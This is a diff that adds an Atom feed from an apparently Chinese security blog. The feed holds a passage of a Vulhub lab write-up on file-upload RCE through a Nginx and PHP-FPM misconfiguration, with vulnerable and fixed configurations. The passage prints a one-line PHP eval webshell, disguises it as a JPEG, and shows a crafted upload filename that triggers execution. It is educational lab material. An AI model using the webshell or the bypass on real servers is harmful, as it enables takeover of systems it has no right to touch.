@@ -1,0 +1,258 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://bae-ace.github.io</id>
+    <title>bae的博客 • Posts by &#34;nginx&#34; tag</title>
+    <link href="https://bae-ace.github.io" />
+    <updated>2025-08-05T07:44:09.000Z</updated>
+    <category term="Web安全" />
+    <category term="Solr" />
+    <category term="XXE" />
+    <category term="漏洞复现" />
+    <category term="Vulhub" />
+    <category term="Kali" />
+    <category term="文件上传" />
+    <category term="RCE" />
+    <category term="Nginx" />
+    <category term="PHP-FPM" />
+    <category term="蚁剑" />
+    <category term="PWN" />
+    <category term="ELF" />
+    <category term="ROP" />
+    <category term="CTF" />
+    <category term="二进制安全" />
+    <category term="PHP" />
+    <category term="SSRF" />
+    <category term="Struts2" />
+    <category term="OGNL注入" />
+    <category term="权限绕过" />
+    <category term="水平越权" />
+    <category term="垂e直越权" />
+    <category term="Pikachu靶场" />
+    <category term="工具" />
+    <category term="sqlmap" />
+    <category term="渗透测试" />
+    <category term="SQL注入" />
+    <category term="网络安全" />
+    <category term="ThinkPHP" />
+    <category term="WebShell" />
+    <category term="冰蝎" />
+    <category term="漏洞利用" />
+    <category term="hexo" />
+    <category term="博客搭建" />
+    <category term="初始测试" />
+    <category term="linux" />
+    <category term="命令" />
+    <category term="命令执行" />
+    <category term="信息收集" />
+    <category term="子域名" />
+    <entry>
+        <id>https://bae-ace.github.io/2025/08/05/Nginx-%E4%B8%8E-PHP-FPM-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RCE-%E6%BC%8F%E6%B4%9E/</id>
+        <title>Nginx 与 PHP-FPM 配置不当导致文件上传 RCE 漏洞（基于 Vulhub）</title>
+        <link rel="alternate" href="https://bae-ace.github.io/2025/08/05/Nginx-%E4%B8%8E-PHP-FPM-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RCE-%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;Nginx-与-PHP-FPM-配置不当导致文件上传-RCE-漏洞详解（基于-Vulhub）&#34;&gt;&lt;a href=&#34;#Nginx-与-PHP-FPM-配置不当导致文件上传-RCE-漏洞详解（基于-Vulhub）&#34; class=&#34;headerlink&#34; title=&#34;Nginx 与 PHP-FPM 配置不当导致文件上传 RCE 漏洞详解（基于 Vulhub）&#34;&gt;&lt;/a&gt;Nginx 与 PHP-FPM 配置不当导致文件上传 RCE 漏洞详解（基于 Vulhub）&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;文件上传漏洞是 Web 安全领域的高危漏洞之一，尤其是结合 &lt;strong&gt;Nginx&lt;/strong&gt; 和 &lt;strong&gt;PHP-FPM&lt;/strong&gt; 配置不当，攻击者可通过伪装文件后缀、路径构造和配置绕过，执行任意 PHP 代码，进而实现 &lt;strong&gt;远程命令执行（RCE）&lt;/strong&gt;。这种漏洞危害极大，可能导致服务器完全失控。本文基于 &lt;strong&gt;Vulhub&lt;/strong&gt; 靶场，详细复现 Nginx 与 PHP-FPM 配置不当导致的文件上传 RCE 漏洞，涵盖原理分析、利用流程、蚁剑连接及防护措施，旨在帮助安全从业者深入理解漏洞成因与防范方法。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;学习目标&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;理解文件上传漏洞结合 Nginx 和 PHP-FPM 的利用链&lt;/li&gt;
+&lt;li&gt;掌握伪装后缀与路径构造的攻击手法&lt;/li&gt;
+&lt;li&gt;学会使用蚁剑进行 WebShell 管理&lt;/li&gt;
+&lt;li&gt;掌握 Nginx 和 PHP-FPM 的安全配置实践&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;二、漏洞背景与原理&#34;&gt;&lt;a href=&#34;#二、漏洞背景与原理&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞背景与原理&#34;&gt;&lt;/a&gt;二、漏洞背景与原理&lt;/h2&gt;&lt;h3 id=&#34;1-漏洞概述&#34;&gt;&lt;a href=&#34;#1-漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;1. 漏洞概述&#34;&gt;&lt;/a&gt;1. 漏洞概述&lt;/h3&gt;&lt;p&gt;文件上传漏洞通常因 Web 应用未严格校验上传文件的类型或内容而产生。当结合 Nginx 和 PHP-FPM 的配置不当，攻击者可上传伪装为图片的文件（如 &lt;code&gt;shell.jpg&lt;/code&gt; 包含 PHP 代码），并通过构造特殊路径（如 &lt;code&gt;/shell.jpg/.phps&lt;/code&gt;）触发 PHP-FPM 解析，从而执行恶意代码，导致 RCE。&lt;/p&gt;
+&lt;h3 id=&#34;2-核心问题&#34;&gt;&lt;a href=&#34;#2-核心问题&#34; class=&#34;headerlink&#34; title=&#34;2. 核心问题&#34;&gt;&lt;/a&gt;2. 核心问题&lt;/h3&gt;&lt;p&gt;漏洞的根源在于以下配置缺陷：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Nginx 配置不当&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;location ~ \.phps&lt;/code&gt; 允许非标准的 &lt;code&gt;.phps&lt;/code&gt; 后缀被 PHP-FPM 解析。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;try_files&lt;/code&gt; 未严格验证路径，导致伪路径绕过。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SCRIPT_FILENAME&lt;/code&gt; 参数未过滤，允许任意文件被当作 PHP 脚本执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PHP-FPM 配置不当&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;security.limit_extensions&lt;/code&gt; 未严格限制，导致 &lt;code&gt;.phps&lt;/code&gt;、&lt;code&gt;.jpg&lt;/code&gt; 等非标准后缀被解析。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;文件上传校验缺失&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;Web 应用未对上传文件内容进行严格检查，允许包含 PHP 代码的伪装文件上传。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-利用链&#34;&gt;&lt;a href=&#34;#3-利用链&#34; class=&#34;headerlink&#34; title=&#34;3. 利用链&#34;&gt;&lt;/a&gt;3. 利用链&lt;/h3&gt;&lt;figure class=&#34;highlight xl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xl&#34;&gt;上传伪装文件（如 &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;shell&lt;/span&gt;.jpg 含 PHP 代码） -&amp;gt;&lt;/span&gt; 构造路径（如 /&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;shell&lt;/span&gt;.jpg/.phps） -&amp;gt;&lt;/span&gt; N&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;ginx&lt;/span&gt; 传递给 PHP-FPM -&amp;gt;&lt;/span&gt; PHP-FPM 解析执行 -&amp;gt; RCE&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;4-危害&#34;&gt;&lt;a href=&#34;#4-危害&#34; class=&#34;headerlink&#34; title=&#34;4. 危害&#34;&gt;&lt;/a&gt;4. 危害&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;代码执行&lt;/strong&gt;：执行任意 PHP 代码，获取服务器信息或上传 WebShell。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;命令执行&lt;/strong&gt;：运行系统命令（如 &lt;code&gt;whoami&lt;/code&gt;、&lt;code&gt;id&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务器接管&lt;/strong&gt;：通过反弹 Shell 或后门控制服务器。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据泄露&lt;/strong&gt;：窃取配置文件、数据库内容等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;三、Nginx-配置误区分析&#34;&gt;&lt;a href=&#34;#三、Nginx-配置误区分析&#34; class=&#34;headerlink&#34; title=&#34;三、Nginx 配置误区分析&#34;&gt;&lt;/a&gt;三、Nginx 配置误区分析&lt;/h2&gt;&lt;p&gt;以下是典型的 Nginx 配置片段（存在漏洞）：&lt;/p&gt;
+&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nginx&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;index&lt;/span&gt; index.html index.php;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;server_name&lt;/span&gt; example.com;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; / &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-attribute&#34;&gt;try_files&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$uri&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$uri&lt;/span&gt;/ =&lt;span class=&#34;hljs-number&#34;&gt;404&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;~ \.phps&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_index&lt;/span&gt; index.php;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;include&lt;/span&gt; fastcgi_params;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_param&lt;/span&gt; REDIRECT_STATUS &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_param&lt;/span&gt; SCRIPT_FILENAME /var/www/html&lt;span class=&#34;hljs-variable&#34;&gt;$fastcgi_script_name&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_param&lt;/span&gt; DOCUMENT_ROOT /var/www/html;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_pass&lt;/span&gt; php:&lt;span class=&#34;hljs-number&#34;&gt;9000&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;1-问题点剖析&#34;&gt;&lt;a href=&#34;#1-问题点剖析&#34; class=&#34;headerlink&#34; title=&#34;1. 问题点剖析&#34;&gt;&lt;/a&gt;1. 问题点剖析&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;.phps&lt;/code&gt; 后缀解析&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;location ~ \.phps&lt;/code&gt; 表示以 &lt;code&gt;.phps&lt;/code&gt; 结尾的请求会交给 PHP-FPM 处理。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.phps&lt;/code&gt; 通常用于源代码高亮显示，不应启用为可执行脚本。&lt;/li&gt;
+&lt;li&gt;攻击者可通过路径构造（如 &lt;code&gt;/uploads/shell.jpg/.phps&lt;/code&gt;）将伪装文件（如 &lt;code&gt;shell.jpg&lt;/code&gt;）当作 PHP 脚本执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SCRIPT_FILENAME 未过滤&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name;&lt;/code&gt; 直接拼接用户输入的路径（&lt;code&gt;$fastcgi_script_name&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;攻击者可提交 &lt;code&gt;/uploads/shell.jpg/.phps&lt;/code&gt;，导致 &lt;code&gt;SCRIPT_FILENAME&lt;/code&gt; 被设置为 &lt;code&gt;/var/www/html/uploads/shell.jpg&lt;/code&gt;，从而执行 &lt;code&gt;shell.jpg&lt;/code&gt; 中的 PHP 代码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;try_files 路径拼接问题&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;try_files $uri $uri/ =404;&lt;/code&gt; 尝试查找 &lt;code&gt;$uri&lt;/code&gt; 或 &lt;code&gt;$uri/&lt;/code&gt;，未对伪路径（如 &lt;code&gt;/shell.jpg/.phps&lt;/code&gt;）进行严格验证。&lt;/li&gt;
+&lt;li&gt;Nginx 将请求传递给 &lt;code&gt;.phps&lt;/code&gt; 的 &lt;code&gt;location&lt;/code&gt;，触发 PHP-FPM 解析。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-正确配置示例&#34;&gt;&lt;a href=&#34;#2-正确配置示例&#34; class=&#34;headerlink&#34; title=&#34;2. 正确配置示例&#34;&gt;&lt;/a&gt;2. 正确配置示例&lt;/h3&gt;&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nginx&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;~ \.php$&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_pass&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;127.0.0.1:9000&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-attribute&#34;&gt;include&lt;/span&gt; fastcgi_params;&lt;br&gt;    &lt;span class=&#34;hljs-attribute&#34;&gt;fastcgi_param&lt;/span&gt; SCRIPT_FILENAME /var/www/html&lt;span class=&#34;hljs-variable&#34;&gt;$fastcgi_script_name&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; /uploads/ &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;~ \.php$&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;403&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;# 禁止 Uploads 目录执行 PHP&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;四、PHP-FPM-配置分析&#34;&gt;&lt;a href=&#34;#四、PHP-FPM-配置分析&#34; class=&#34;headerlink&#34; title=&#34;四、PHP-FPM 配置分析&#34;&gt;&lt;/a&gt;四、PHP-FPM 配置分析&lt;/h2&gt;&lt;h3 id=&#34;1-security-limit-extensions-参数&#34;&gt;&lt;a href=&#34;#1-security-limit-extensions-参数&#34; class=&#34;headerlink&#34; title=&#34;1. security.limit_extensions 参数&#34;&gt;&lt;/a&gt;1. &lt;code&gt;security.limit_extensions&lt;/code&gt; 参数&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;位于 PHP-FPM 配置文件（如 &lt;code&gt;/etc/php-fpm.d/www.conf&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;限制哪些文件后缀可被 PHP-FPM 解析为 PHP 脚本。&lt;/li&gt;
+&lt;li&gt;默认值：&lt;code&gt;.php .php3 .php4 .php5&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;[www]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;security.limit_extensions&lt;/span&gt; = .php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-配置不当的后果&#34;&gt;&lt;a href=&#34;#2-配置不当的后果&#34; class=&#34;headerlink&#34; title=&#34;2. 配置不当的后果&#34;&gt;&lt;/a&gt;2. 配置不当的后果&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;弱配置&lt;/strong&gt;：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;security.limit_extensions&lt;/span&gt; = .php .phps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+允许 &lt;code&gt;.phps&lt;/code&gt; 被解析，攻击者可通过 &lt;code&gt;/shell.jpg/.phps&lt;/code&gt; 执行伪装文件。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;更危险&lt;/strong&gt;：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;security.limit_extensions =&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+为空时，PHP-FPM 解析任意后缀（如 &lt;code&gt;.jpg&lt;/code&gt;、&lt;code&gt;.txt&lt;/code&gt;），极大增加漏洞风险。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-安全配置&#34;&gt;&lt;a href=&#34;#3-安全配置&#34; class=&#34;headerlink&#34; title=&#34;3. 安全配置&#34;&gt;&lt;/a&gt;3. 安全配置&lt;/h3&gt;&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;[www]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;security.limit_extensions&lt;/span&gt; = .php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;仅允许 &lt;code&gt;.php&lt;/code&gt; 文件被解析。&lt;/li&gt;
+&lt;li&gt;杜绝 &lt;code&gt;.phps&lt;/code&gt;、&lt;code&gt;.jpg&lt;/code&gt; 等非标准后缀的执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;五、漏洞复现步骤&#34;&gt;&lt;a href=&#34;#五、漏洞复现步骤&#34; class=&#34;headerlink&#34; title=&#34;五、漏洞复现步骤&#34;&gt;&lt;/a&gt;五、漏洞复现步骤&lt;/h2&gt;&lt;h3 id=&#34;1-环境搭建&#34;&gt;&lt;a href=&#34;#1-环境搭建&#34; class=&#34;headerlink&#34; title=&#34;1. 环境搭建&#34;&gt;&lt;/a&gt;1. 环境搭建&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：Vulhub（Nginx + PHP-FPM 漏洞环境）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;步骤&lt;/strong&gt;：&lt;ol&gt;
+&lt;li&gt;克隆 Vulhub 项目：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/nginx/php-fpm&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;启动靶场：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sudo&lt;/span&gt; docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;验证环境：&lt;ul&gt;
+&lt;li&gt;访问 &lt;code&gt;http://localhost:8080&lt;/code&gt;，确认 Nginx 运行正常。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-构造伪装木马&#34;&gt;&lt;a href=&#34;#2-构造伪装木马&#34; class=&#34;headerlink&#34; title=&#34;2. 构造伪装木马&#34;&gt;&lt;/a&gt;2. 构造伪装木马&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;创建 PHP WebShell：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;?php @eval(\$_POST[&amp;#x27;cmd&amp;#x27;]); ?&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt; shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;伪装为图片：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;mv&lt;/span&gt; shell.php 1.jpg&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;3-上传伪装文件&#34;&gt;&lt;a href=&#34;#3-上传伪装文件&#34; class=&#34;headerlink&#34; title=&#34;3. 上传伪装文件&#34;&gt;&lt;/a&gt;3. 上传伪装文件&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;假设目标站点有文件上传功能（如 &lt;code&gt;/upload.php&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;使用 Burp Suite 拦截上传请求，修改文件名：&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;Content-Disposition: form-data; &lt;span class=&#34;hljs-attribute&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;; &lt;span class=&#34;hljs-attribute&#34;&gt;filename&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1.jpg/.phps&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;上传后，文件存储在 &lt;code&gt;/uploads/1.jpg&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
